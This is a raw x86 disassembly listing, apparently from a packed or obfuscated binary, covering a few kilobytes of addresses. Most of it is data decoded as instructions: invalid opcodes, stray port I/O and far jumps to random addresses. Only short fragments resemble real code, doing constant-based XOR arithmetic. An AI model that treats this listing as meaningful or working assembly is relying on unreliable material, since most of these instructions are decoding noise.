  4051b1:	jl     0x405156
  4051b3:	mov    ebp,esp
  4051b5:	sbb    eax,0xd88c62e0
  4051ba:	push   ecx
  4051bb:	lahf   
  4051bc:	jmp    0x40521c
  4051be:	test   DWORD PTR [bp+0xb],edi
  4051c2:	test   al,0x77
  4051c4:	adc    dh,BYTE PTR [eax+0x1769691]
  4051ca:	mov    edi,0xb96d429b
  4051cf:	xchg   ebp,eax
  4051d0:	dec    DWORD PTR [esi+0x6]
  4051d3:	add    eax,0x40076086
  4051d8:	(bad)  
  4051d9:	imul   DWORD PTR [edi-0x40]
  4051dc:	mov    bl,dl
  4051de:	inc    esp
  4051df:	mov    esp,0x53156d4a
  4051e4:	mov    ebp,0x58ee6629
  4051e9:	dec    edi
  4051ea:	mov    eax,ds:0xaa080f5e
  4051ef:	out    0x18,eax
  4051f1:	addr16 ss ret 
  4051f4:	retf   0xf735
  4051f7:	cld    
  4051f8:	call   0xe905:0x283d8f12
  4051ff:	sub    al,ah
  405201:	mov    eax,ds:0x83e7d3d3
  405206:	mov    dh,0x88
  405208:	jae    0x405234
  40520a:	mov    bh,0x84
  40520c:	into   
  40520d:	in     eax,dx
  40520e:	add    dh,BYTE PTR [eax]
  405210:	div    dh
  405212:	sub    BYTE PTR [esi+edx*2-0x14],dh
  405216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405217:	hlt    
  405218:	push   ss
  405219:	jg     0x405293
  40521b:	inc    edx
  40521c:	sub    eax,0x425c7e53
  405221:	lock jle 0x4051b5
  405224:	test   BYTE PTR [ecx-0x452a3ffa],ch
  40522a:	inc    ecx
  40522b:	dec    edi
  40522c:	jbe    0x40520f
  40522e:	jae    0x4052a7
  405230:	mov    BYTE PTR [edi],cl
  405232:	push   es
  405233:	mov    bl,0xb5
  405235:	add    al,0xa6
  405237:	add    eax,0x13f432b7
  40523c:	shr    BYTE PTR [esi-0x20],cl
  40523f:	inc    ebx
  405240:	das    
  405241:	loop   0x4051f4
  405243:	pop    ds
  405244:	xchg   ebx,eax
  405245:	ret    0x23e5
  405248:	je     0x4051cb
  40524a:	push   edi
  40524b:	(bad)  
  40524c:	lea    eax,ds:0x32561ed8
  405252:	shl    DWORD PTR [esi+0x33081abb],1
  405258:	jmp    FWORD PTR [eax-0x5f]
  40525b:	ins    DWORD PTR es:[edi],dx
  40525c:	pop    ebx
  40525d:	std    
  40525e:	xchg   ecx,eax
  40525f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405260:	int    0x9c
  405262:	shl    esi,1
  405264:	(bad)
  405267:	jne    0x4052b9
  405269:	lock aad 0x33
  40526c:	outs   dx,DWORD PTR ds:[esi]
  40526d:	jne    0x40522b
  40526f:	adc    cl,BYTE PTR [ebx-0x6b]
  405272:	inc    edi
  405273:	je     0x40525d
  405275:	fnstcw WORD PTR [ecx*4-0x6b5ee928]
  40527c:	jmp    0x36d998ba
  405281:	iret   
  405282:	push   esp
  405283:	mov    dl,0x7b
  405285:	ret    0xa3b7
  405288:	aam    0x47
  40528a:	outs   dx,DWORD PTR ds:[esi]
  40528b:	xor    BYTE PTR [edi+edx*8+0x2b6474dd],bh
  405292:	cmp    al,BYTE PTR [eax+0x206efd7]
  405298:	jo     0x405221
  40529a:	xor    ecx,esp
  40529c:	inc    ebx
  40529d:	icebp  
  40529e:	sub    al,0x7a
  4052a0:	fcos   
  4052a2:	xchg   edi,eax
  4052a3:	dec    ebp
  4052a4:	push   0xa481a3b2
  4052a9:	pop    ds
  4052aa:	cs mov ebx,0x1f7900b8
  4052b0:	jno    0x40527b
  4052b2:	push   ds
  4052b3:	jb     0x405264
  4052b5:	sbb    eax,0x2434c36e
  4052ba:	pushf  
  4052bb:	clc    
  4052bc:	retf   0xde4f
  4052bf:	pop    ss
  4052c0:	dec    ecx
  4052c1:	push   eax
  4052c2:	int3   
  4052c3:	sbb    dl,BYTE PTR [ebx]
  4052c5:	stc    
  4052c6:	out    0xae,eax
  4052c8:	aaa    
  4052c9:	outs   dx,BYTE PTR ds:[esi]
  4052ca:	imul   edi,DWORD PTR [esi+ecx*1-0x5a],0xd0254667
  4052d2:	xchg   edx,eax
  4052d3:	fild   WORD PTR [ebx-0x76]
  4052d6:	call   0x4860e5f4
  4052db:	test   eax,0x8041dae2
  4052e0:	sbb    bh,BYTE PTR [edi+ebx*1]
  4052e3:	fnstenv [ebx+0x1d646192]
  4052e9:	push   edi
  4052ea:	or     BYTE PTR [esi-0x18],bl
  4052ed:	mov    edx,0x1910b010
  4052f2:	aam    0xaf
  4052f4:	out    0xb2,al
  4052f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052f7:	xchg   ebp,eax
  4052f8:	push   edx
  4052f9:	bound  edx,QWORD PTR [eax]
  4052fb:	es jl  0x4052eb
  4052fe:	adc    DWORD PTR [ecx+0x5b],ebp
  405301:	sub    esp,ecx
  405303:	pop    ss
  405304:	stc    
  405305:	fsqrt  
  405307:	neg    DWORD PTR [esi+0x32fd9c26]
  40530d:	xchg   esi,eax
  40530e:	push   ss
  40530f:	in     eax,0x37
  405311:	mov    ds:0x4d49536,eax
  405316:	xor    dh,BYTE PTR [edx+0x1c]
  405319:	xor    cl,BYTE PTR [ebx-0x3c]
  40531c:	pop    es
  40531d:	mov    BYTE PTR [ebx+0x1296f50b],cl
  405323:	sub    cl,0xd1
  405326:	add    esp,edx
  405328:	neg    edx
  40532a:	popf   
  40532b:	mov    al,ds:0x81931061
  405330:	mov    bl,0xc8
  405332:	mov    BYTE PTR [ecx],0xd4
  405335:	or     al,0x7c
  405337:	xor    eax,0xa437a702
  40533c:	mov    bl,0x90
  40533e:	or     al,ah
  405340:	sbb    BYTE PTR [edx-0x6f],ah
  405343:	jns    0x405384
  405345:	sub    ch,bl
  405347:	sti    
  405348:	add    eax,0x3296bbf3
  40534d:	aas    
  40534e:	jl     0x4052d2
  405350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405351:	push   ebp
  405352:	xchg   ebx,eax
  405353:	out    0x86,al
  405355:	stos   BYTE PTR es:[edi],al
  405356:	aam    0x1
  405358:	enter  0x3d0b,0xd0
  40535c:	jle    0x4052e6
  40535e:	push   ecx
  40535f:	add    BYTE PTR [ebx-0x57d25a7a],cl
  405365:	and    DWORD PTR [esi-0x5fa29d4d],ebp
  40536b:	loop   0x405331
  40536d:	and    eax,0x50973871
  405372:	jmp    0x40532e
  405374:	lods   eax,DWORD PTR ds:[esi]
  405375:	mov    ds:0x19ac7151,eax
  40537a:	adc    eax,0x1f2c8935
  40537f:	jmp    0x9e83d352
  405384:	jns    0x405331
  405386:	outs   dx,BYTE PTR ds:[esi]
  405387:	test   BYTE PTR [ebx+0x78],0x55
  40538b:	and    al,0xef
  40538d:	sbb    eax,0x9276bf92
  405392:	dec    eax
  405393:	(bad)  
  405394:	xlat   BYTE PTR ds:[ebx]
  405395:	clc    
  405396:	(bad)  
  405397:	add    eax,0xf8ff5ddf
  40539c:	sbb    dl,BYTE PTR [edx-0xaa7dd64]
  4053a2:	aad    0xc8
  4053a4:	xor    DWORD PTR [edx-0x71fe0e33],ecx
  4053aa:	aas    
  4053ab:	add    al,0x8d
  4053ad:	sbb    eax,0x4289a93f
  4053b2:	cmc    
  4053b3:	sbb    al,BYTE PTR [eax+0xb]
  4053b6:	fwait
  4053b7:	cli    
  4053b8:	(bad)  [ebp-0x39]
  4053bb:	fwait
  4053bc:	rcl    BYTE PTR [edi-0x462ba7ac],1
  4053c2:	cmp    cl,BYTE PTR [eax]
  4053c4:	xor    cl,BYTE PTR [esi-0x722ab0e8]
  4053ca:	pop    eax
  4053cb:	fild   DWORD PTR [ebp-0xfb48dde]
  4053d1:	imul   esi,DWORD PTR [ecx+0x60],0xae3f8a0b
  4053d8:	lahf   
  4053d9:	stos   DWORD PTR es:[edi],eax
  4053da:	xchg   ecx,eax
  4053db:	repz retf 0x2a03
  4053df:	and    esp,DWORD PTR [edx+0x6e]
  4053e2:	hlt    
  4053e3:	xor    eax,0x1a9812ea
  4053e8:	nop
  4053e9:	dec    esi
  4053ea:	xadd   ch,bh
  4053ed:	pop    eax
  4053ee:	sahf   
  4053ef:	cmp    edi,DWORD PTR [esi]
  4053f1:	xor    bh,0xd5
  4053f4:	lods   eax,DWORD PTR ds:[esi]
  4053f5:	xchg   ecx,eax
  4053f6:	add    DWORD PTR [edi-0x71],0x2c
  4053fa:	sbb    ah,BYTE PTR [eax+0x464e0479]
  405400:	ins    DWORD PTR es:[edi],dx
  405401:	dec    esp
  405402:	fnsetpm(287 only) 
  405404:	inc    esi
  405405:	icebp  
  405406:	cdq    
  405407:	int    0x1f
  405409:	jge    0x405470
  40540b:	stos   DWORD PTR es:[edi],eax
  40540c:	mov    ecx,0x554ac723
  405411:	or     DWORD PTR [edx-0x4],0xa0136c36
  405418:	call   0x78ac:0x829bdf54
  40541f:	jp     0x4053bd
  405421:	ds jbe 0x405419
  405424:	inc    esp
  405425:	push   esp
  405426:	test   dl,dh
  405428:	(bad)
  40542c:	push   eax
  40542d:	pop    eax
  40542e:	adc    bl,BYTE PTR [eax+0x60]
  405431:	cld    
  405432:	scas   eax,DWORD PTR es:[edi]
  405433:	xor    eax,0xb52f0d31
  405438:	not    BYTE PTR [esi-0x318f1b01]
  40543e:	sbb    WORD PTR [edi-0x1d],sp
  405442:	mov    ch,0x0
  405444:	aaa    
  405445:	mov    ds:0xc574cfb4,al
  40544a:	adc    DWORD PTR [esi],ebx
  40544c:	dec    eax
  40544d:	enter  0xa599,0xe6
  405451:	xor    al,0x4a
  405453:	and    eax,0xf042c9bb
  405458:	xor    BYTE PTR [ebx],0x26
  40545b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40545c:	ret    0x7fe6
  40545f:	hlt    
  405460:	fwait
  405461:	inc    edi
  405462:	loop   0x40549f
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x61b50448]
  405484:	mov    edx,0x7e2bd070
  405489:	jle    0x4054e3
  40548b:	jl     0x40550b
  40548d:	jle    0x40545c
  40548f:	test   dh,0x77
  405492:	xlat   BYTE PTR ds:[ebx]
  405493:	add    DWORD PTR [ebx+0x19],esi
  405496:	pop    edx
  405497:	push   esi
  405498:	int3   
  405499:	push   es
  40549a:	into   
  40549b:	pop    ecx
  40549c:	xor    DWORD PTR [ecx],edi
  40549e:	add    ch,BYTE PTR ds:0xad788461
  4054a4:	hlt    
  4054a5:	mov    bh,0x16
  4054a7:	xor    eax,0x4d5c26e
  4054ac:	jns    0x4054b0
  4054ae:	sbb    ah,0xb
  4054b1:	dec    eax
  4054b2:	adc    cl,BYTE PTR [ebx]
  4054b4:	adc    ecx,ecx
  4054b6:	(bad)  [eax-0x47d31289]
  4054bc:	stc    
  4054bd:	xor    ah,BYTE PTR [ebx+0x70]
  4054c0:	pop    ds
  4054c1:	xor    BYTE PTR [ecx],bl
  4054c3:	pop    ebx
  4054c4:	call   0x7d6330ed
  4054c9:	or     BYTE PTR [ecx+0x47],0xcb
  4054cd:	cld    
  4054ce:	sahf   
  4054cf:	xchg   ecx,eax
  4054d0:	inc    edi
  4054d1:	nop
  4054d2:	sub    esi,edi
  4054d4:	mov    WORD PTR [ebp-0x157a39c3],ss
  4054da:	call   0x6e092640
  4054df:	jb     0x4054de
  4054e1:	pop    ebp
  4054e2:	pop    ss
  4054e3:	test   dh,dh
  4054e5:	adc    al,0x62
  4054e7:	in     eax,0xe3
  4054e9:	mov    ebx,0xaa423ff9
  4054ee:	xor    BYTE PTR [ecx-0xa],al
  4054f1:	pop    eax
  4054f2:	xor    edx,DWORD PTR [ebx]
  4054f4:	cmp    eax,0xc157c51
  4054f9:	add    BYTE PTR [eax-0x67],al
  4054fc:	mov    dl,0x19
  4054fe:	sbb    ebp,edi
  405500:	stc    
  405501:	xchg   DWORD PTR [ecx+0x414d9c68],edi
  405507:	sub    eax,0xdfcb0b76
  40550c:	lods   al,BYTE PTR ds:[esi]
  40550d:	mov    edi,0x55b4a933
  405512:	stos   DWORD PTR es:[edi],eax
  405513:	sbb    ah,BYTE PTR [ebx-0x18]
  405516:	outs   dx,DWORD PTR ds:[esi]
  405517:	into   
  405518:	xchg   edx,eax
  405519:	mov    WORD PTR [edi-0x4c0968d1],?
  40551f:	add    edi,ebx
  405521:	xor    BYTE PTR [edx-0x763d2d84],dl
  405527:	xchg   ebx,eax
  405528:	sub    al,0xfa
  40552a:	and    edx,DWORD PTR [eax-0x17522731]
  405530:	repz adc DWORD PTR [esi-0x23c04731],0xfffffff9
  405538:	call   0xf3289a46
  40553d:	cmp    BYTE PTR [edi+0x30c14ead],0xa6
  405544:	mov    bh,0xf7
  405546:	test   DWORD PTR [eax-0x63072678],0xac5ac0ac
  405550:	ret    
  405551:	cmp    eax,0x109bceed
  405556:	ror    BYTE PTR [ebx],1
  405558:	mov    eax,ds:0x57e99acc
  40555d:	mov    ah,0xca
  40555f:	lahf   
  405560:	pop    ecx
  405561:	sahf   
  405562:	pop    ds
  405563:	fs out 0xf1,al
  405566:	je     0x40555f
  405568:	sub    al,0x31
  40556a:	jae    0x405542
  40556c:	js     0x405563
  40556e:	std    
  40556f:	mov    ?,ecx
  405571:	mov    BYTE PTR [edx-0x1b3f6246],ah
  405577:	loopne 0x40552d
  405579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40557a:	jb     0x40552f
  40557c:	mov    edi,0x35da0a46
  405581:	add    ebp,ebp
  405583:	rcr    BYTE PTR [eax+eiz*8],1
  405586:	ja     0x40555e
  405588:	fimul  WORD PTR [edx+0x14]
  40558b:	mov    cl,0xfe
  40558d:	inc    edx
  40558e:	cmp    DWORD PTR [ecx+0x20],edx
  405591:	lock (bad) 
  405593:	ret    0xed14
  405596:	mov    esi,0x4f2475d9
  40559b:	adc    eax,0x7ce16a37
  4055a0:	push   esp
  4055a1:	stos   BYTE PTR es:[edi],al
  4055a2:	pop    es
  4055a3:	adc    al,0xb2
  4055a5:	sub    esi,DWORD PTR [eax]
  4055a7:	inc    esp
  4055a8:	bound  edx,QWORD PTR [ebx+eax*1]
  4055ab:	sti    
  4055ac:	dec    ebp
  4055ad:	xchg   BYTE PTR [ebp+eiz*2+0x2964df4c],al
  4055b4:	(bad)  
  4055b5:	mov    edi,0xd09615aa
  4055ba:	(bad)  
  4055bb:	jmp    0x59edeac5
  4055c0:	(bad)  
  4055c1:	pop    ss
  4055c2:	lahf   
  4055c3:	out    0x8e,al
  4055c5:	jp     0x4055bd
  4055c7:	mov    dh,0x5f
  4055c9:	ja     0x405636
  4055cb:	sbb    edx,DWORD PTR [edi+eiz*4+0x3aeba1d7]
  4055d2:	popa   
  4055d3:	jb     0x40561e
  4055d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055d6:	mov    al,0xba
  4055d8:	scas   al,BYTE PTR es:[edi]
  4055d9:	pusha  
  4055da:	fs push ebp
  4055dc:	sbb    DWORD PTR [esi+eax*4],0x59
  4055e0:	xchg   edi,eax
  4055e1:	test   al,0x2d
  4055e3:	sub    BYTE PTR [edx],0x2c
  4055e6:	pop    esp
  4055e7:	push   edi
  4055e8:	scas   al,BYTE PTR es:[edi]
  4055e9:	cli    
  4055ea:	data16 cli 
  4055ec:	lds    ecx,FWORD PTR [ecx]
  4055ee:	mov    edi,0x98075b92
  4055f3:	pop    esi
  4055f4:	hlt    
  4055f5:	mov    ah,0x39
  4055f7:	sub    al,0xe6
  4055f9:	sub    BYTE PTR [eax+eiz*8],al
  4055fc:	dec    eax
  4055fd:	pop    ebx
  4055fe:	sub    al,0x41
  405600:	pop    ds
  405601:	xchg   ebx,eax
  405602:	ror    DWORD PTR [eax],1
  405604:	loope  0x4055cb
  405606:	pop    edx
  405607:	ins    BYTE PTR es:[edi],dx
  405608:	adc    esi,ebx
  40560a:	and    bh,al
  40560c:	xor    edx,DWORD PTR [edx+0x59]
  40560f:	mov    cl,0xa0
  405611:	bnd jp 0x40568d
  405614:	call   0x3275e793
  405619:	pop    ebp
  40561a:	cmp    BYTE PTR [eax],cl
  40561c:	out    0x62,al
  40561e:	aad    0xb
  405620:	dec    ebp
  405621:	and    eax,0xa7367f5a
  405626:	pop    eax
  405627:	(bad)  
  405628:	nop
  405629:	cmc    
  40562a:	push   0x77814dc1
  40562f:	test   al,0x7a
  405631:	jle    0x40565c
  405633:	lods   eax,DWORD PTR ds:[esi]
  405634:	xchg   DWORD PTR [ebx-0x6c498c4c],edx
  40563a:	xor    DWORD PTR [eax],esp
  40563c:	int3   
  40563d:	sbb    esp,DWORD PTR [edx+eiz*4]
  405640:	call   0x189e2173
  405645:	jno    0x405672
  405647:	stos   BYTE PTR es:[edi],al
  405648:	out    0xca,al
  40564a:	cdq    
  40564b:	ret    
  40564c:	mov    ah,0x68
  40564e:	fs push esi
  405650:	adc    al,0xaa
  405652:	mov    eax,ds:0x35205271
  405657:	xor    DWORD PTR [ebx+0xe],0xc
  40565b:	in     al,0x58
  40565d:	dec    esp
  40565e:	jnp    0x4056b2
  405660:	push   0xffffffc4
  405662:	xor    al,0x95
  405664:	hlt    
  405665:	sub    edx,DWORD PTR [ebp+0x4d]
  405668:	test   eax,0x15463cdf
  40566d:	sbb    eax,0x89b523b
  405672:	jmp    eax
  405674:	add    eax,0xe455d350
  405679:	test   al,0x3f
  40567b:	jmp    0xedcd:0x557e781b
  405682:	aaa    
  405683:	test   BYTE PTR [ebp-0x65ea9256],cl
  405689:	rcr    bh,0xa6
  40568c:	mov    edx,0xd48d2265
  405691:	fdiv   DWORD PTR [edi-0x4dcd22ba]
  405697:	cmp    BYTE PTR [eax+0x6831d7af],dh
  40569d:	loop   0x4056d7
  40569f:	(bad)  
  4056a0:	std    
  4056a1:	lds    edx,FWORD PTR ds:[esi-0x68]
  4056a5:	lea    esp,[ebp+0x36db2618]
  4056ab:	cld    
  4056ac:	inc    eax
  4056ad:	xchg   ecx,eax
  4056ae:	out    0xe7,al
  4056b0:	pop    edi
  4056b1:	es xchg edx,eax
  4056b3:	sbb    esp,DWORD PTR es:[eax+0x16]
  4056b7:	inc    esp
  4056b8:	test   BYTE PTR [ebp-0x5879c69b],bl
  4056be:	pop    ecx
  4056bf:	adc    DWORD PTR [ebp-0x72ba260],ebp
  4056c5:	adc    al,0x4e
  4056c7:	jge    0x40570e
  4056c9:	push   ebx
  4056ca:	add    eax,0x9d7c7b92
  4056cf:	fwait
  4056d0:	push   ss
  4056d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d2:	mov    esi,0x947bc017
  4056d7:	je     0x40565a
  4056d9:	(bad)  
  4056da:	xor    al,BYTE PTR [eax]
  4056dc:	add    bh,0x4e
  4056df:	push   ds
  4056e0:	popf   
  4056e1:	inc    BYTE PTR [esp+ebx*8]
  4056e4:	je     0x4056e3
  4056e6:	fmul   st,st(0)
  4056e8:	or     esp,DWORD PTR [ecx-0x54]
  4056eb:	lds    edx,FWORD PTR [esi+eax*2+0x4b85ce35]
  4056f2:	mov    al,bl
  4056f4:	out    dx,al
  4056f5:	sub    DWORD PTR [ebx+edx*2+0x7b],0xffffff94
  4056fa:	and    al,0xd1
  4056fc:	sti    
  4056fd:	(bad)  
  4056ff:	pop    edi
  405700:	cmp    BYTE PTR [ecx],cl
  405702:	push   edi
  405703:	popf   
  405704:	sub    esp,DWORD PTR [edx+ecx*2-0x33]
  405708:	xor    edx,esi
  40570a:	pop    esi
  40570b:	push   ss
  40570c:	cli    
  40570d:	outs   dx,BYTE PTR ds:[esi]
  40570e:	popf   
  40570f:	stos   DWORD PTR es:[edi],eax
  405710:	fs and eax,0x532ea729
  405716:	les    edi,FWORD PTR [ebp+0x45]
  405719:	mov    BYTE PTR [edx+esi*2-0x4b],0x95
  40571e:	and    al,0x4f
  405720:	cs test esi,esp
  405723:	inc    ecx
  405724:	inc    ebx
  405725:	xchg   ebx,eax
  405726:	inc    edi
  405727:	hlt    
  405728:	fsub   QWORD PTR [ebx+0xda5f68]
  40572e:	in     eax,0x5d
  405730:	jmp    0x40574c
  405732:	inc    ebp
  405733:	loope  0x4057a9
  405735:	loop   0x405795
  405737:	jnp    0x405773
  405739:	push   ebp
  40573a:	sti    
  40573b:	and    al,0x66
  40573d:	in     eax,dx
  40573e:	or     BYTE PTR [ebx-0x76050dbb],ch
  405744:	jbe    0x4056cf
  405746:	in     al,0x38
  405748:	lock xor al,0xd4
  40574b:	xor    dh,BYTE PTR ds:0x7476ba11
  405751:	dec    esi
  405752:	push   ebx
  405753:	push   ebx
  405754:	or     dh,BYTE PTR [ecx+0x68]
  405757:	xchg   ebx,eax
  405758:	xchg   ecx,eax
  405759:	mov    eax,ds:0xd63e2441
  40575e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40575f:	and    BYTE PTR [ebx],ch
  405761:	xor    edi,ebp
  405763:	test   BYTE PTR [esi],dl
  405765:	mov    DWORD PTR [ebp-0x1b],eax
  405768:	push   esp
  40576a:	add    DWORD PTR [edi-0x76],edi
  40576d:	sub    ebx,DWORD PTR [edi-0x24]
  405770:	xchg   BYTE PTR [esi],cl
  405772:	aas    
  405773:	imul   esi,DWORD PTR [ebx],0xfd103d0
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x47
  4057f5:	ds es xchg edx,eax
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	sub    eax,DWORD PTR [ebx]
  405802:	ins    DWORD PTR es:[edi],dx
  405803:	xchg   ebp,eax
  405804:	xchg   esp,eax
  405805:	sub    DWORD PTR [ebx],esi
  405807:	jle    0x405796
  405809:	add    al,0x93
  40580b:	or     WORD PTR [ebx],0xffb2
  40580f:	(bad)  
  405810:	(bad)  
  405812:	jnp    0x4057c1
  405814:	xor    BYTE PTR [edx-0xb],ah
  405817:	xchg   ebp,eax
  405818:	outs   dx,DWORD PTR ds:[esi]
  405819:	into   
  40581a:	and    BYTE PTR [edx-0x7df311ee],al
  405820:	iret   
  405821:	cmp    al,ah
  405823:	or     ebp,DWORD PTR [edi+ebx*8-0x6a]
  405827:	fild   DWORD PTR [edi+0x353a763f]
  40582d:	sub    dh,BYTE PTR [esi]
  40582f:	xor    esi,edx
  405831:	or     bl,bl
  405833:	cld    
  405834:	loopne 0x405814
  405836:	fsubr  st(3),st
  405838:	dec    esi
  405839:	pop    edi
  40583a:	in     eax,dx
  40583b:	dec    ecx
  40583c:	pop    esp
  40583d:	enter  0x1daa,0x18
  405841:	dec    ecx
  405842:	pop    ss
  405843:	pop    edx
  405844:	pop    ds
  405845:	xchg   BYTE PTR [esp+edx*8+0x177b6d2b],al
  40584c:	push   ds
  40584d:	cmp    BYTE PTR [ebp-0x1b680646],cl
  405853:	sub    al,0x38
  405855:	push   cs
  405856:	jg     0x40582c
  405858:	and    eax,0x63ab8c2e
  40585d:	add    al,0x97
  40585f:	adc    esp,DWORD PTR [edi-0x58]
  405862:	push   esi
  405863:	sub    dl,BYTE PTR [edi]
  405865:	xchg   edi,eax
  405866:	stc    
  405867:	mov    ss,ebx
  405869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40586a:	jp     0x405861
  40586c:	pop    ss
  40586d:	push   ebx
  40586e:	cmp    DWORD PTR [ebx],0xcfd20c9e
  405874:	test   BYTE PTR [ebx],bl
  405876:	fimul  DWORD PTR [eax+ebx*4]
  405879:	add    BYTE PTR [ecx],dh
  40587b:	das    
  40587c:	jle    0x40585d
  40587e:	cmp    eax,0xd5ff16a3
  405883:	mov    DWORD PTR [edx-0x23a1bde6],esi
  405889:	(bad)  
  40588a:	jmp    0x405825
  40588c:	imul   edx,DWORD PTR [ebx+esi*2],0xffffff8b
  405890:	inc    ebp
  405891:	inc    ebp
  405892:	xor    BYTE PTR [ebx+0xb],0x94
  405896:	sbb    eax,0x9890a8fd
  40589b:	in     al,0x98
  40589d:	xchg   ebp,esi
  40589f:	jmp    0x405822
  4058a1:	fiadd  DWORD PTR [esi+0x524908b6]
  4058a7:	std    
  4058a8:	or     eax,0xa22f6f52
  4058ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058af:	test   al,0x18
  4058b1:	pop    ss
  4058b2:	rol    BYTE PTR [eax+0x6bf1d7e5],cl
  4058b8:	and    BYTE PTR [esi-0x7535702f],bh
  4058be:	inc    ebp
  4058bf:	ret    0x4b15
  4058c2:	mov    eax,ds:0xdc7bc936
  4058c7:	popf   
  4058c8:	mov    cl,0xf9
  4058ca:	out    0xd6,eax
  4058cc:	scas   al,BYTE PTR es:[edi]
  4058cd:	outs   dx,DWORD PTR ds:[esi]
  4058ce:	sbb    DWORD PTR [ecx-0x343e87a9],eax
  4058d4:	call   0x52cd:0x931242aa
  4058db:	stos   DWORD PTR es:[edi],eax
  4058dc:	mov    esp,0x95c188d6
  4058e1:	pop    ecx
  4058e2:	or     DWORD PTR [eax+0x46],esi
  4058e5:	jno    0x4058c9
  4058e7:	js     0x40595a
  4058e9:	cmp    al,0xfb
  4058eb:	inc    ebp
  4058ec:	retf   
  4058ed:	sub    bl,BYTE PTR [ebx+eiz*8]
  4058f0:	xchg   BYTE PTR [edi-0x18a8cb],ch
  4058f6:	mov    edi,0xe8a1d3b8
  4058fb:	test   eax,0x21665e74
  405900:	dec    ecx
  405901:	pop    esp
  405902:	sbb    BYTE PTR [ecx+esi*1-0x24],ch
  405906:	sub    bl,BYTE PTR [ecx-0x5b]
  405909:	xchg   ebx,edx
  40590b:	loope  0x4058b7
  40590d:	sub    al,0x61
  40590f:	jge    0x405891
  405911:	pop    eax
  405912:	mov    edi,esp
  405914:	xchg   edx,eax
  405915:	dec    esp
  405916:	adc    ah,BYTE PTR [eax+0x4d]
  405919:	sbb    edx,DWORD PTR [ebx-0x36]
  40591c:	jne    0x40593b
  40591e:	sar    ebp,0x89
  405921:	popa   
  405922:	out    0xb9,eax
  405924:	cmp    eax,DWORD PTR [eax-0xafc1c5b]
  40592a:	sub    ebx,DWORD PTR [eax-0x6cd60e41]
  405930:	inc    ebp
  405931:	jbe    0x4058f7
  405933:	addr16 mov al,ds:0xe8e3
  405937:	pop    eax
  405938:	pop    esp
  405939:	mov    ah,0x23
  40593b:	int    0x6a
  40593d:	frstor [esi]
  40593f:	jb     0x4058da
  405941:	gs push esi
  405943:	jnp    0x40594a
  405945:	rol    DWORD PTR [edi+0x4743baeb],1
  40594b:	mov    dl,0x0
  40594d:	clc    
  40594e:	icebp  
  40594f:	inc    ecx
  405950:	inc    edx
  405951:	out    dx,al
  405952:	into   
  405953:	shl    BYTE PTR [eax+eiz*8-0x1eca8dd7],cl
  40595a:	push   0xffffffc8
  40595c:	dec    ebp
  40595d:	aaa    
  40595e:	push   ebp
  405960:	cmp    cl,ch
  405962:	adc    eax,DWORD PTR [ecx]
  405964:	or     DWORD PTR gs:[ecx],0xfffffff5
  405968:	pop    ds
  405969:	add    DWORD PTR [ebx],edx
  40596b:	call   0xc77b:0xbd368858
  405972:	jbe    0x405937
  405974:	xlat   BYTE PTR ds:[ebx]
  405975:	out    dx,al
  405976:	shl    al,0x87
  405979:	or     ebx,DWORD PTR [edx-0x7b5a88e8]
  40597f:	ss gs pop es
  405982:	fyl2xp1 
  405984:	xor    BYTE PTR [esi],ah
  405986:	sbb    eax,esp
  405988:	mov    ds,WORD PTR [ecx-0x48]
  40598b:	mov    ebx,ss
  40598d:	cmp    DWORD PTR [esi+0x1],0xf0462053
  405994:	ret    
  405995:	sub    dh,0xed
  405998:	sub    eax,0x446505af
  40599d:	mov    edx,0xb6351287
  4059a2:	es mov bl,0xe1
  4059a5:	pop    edx
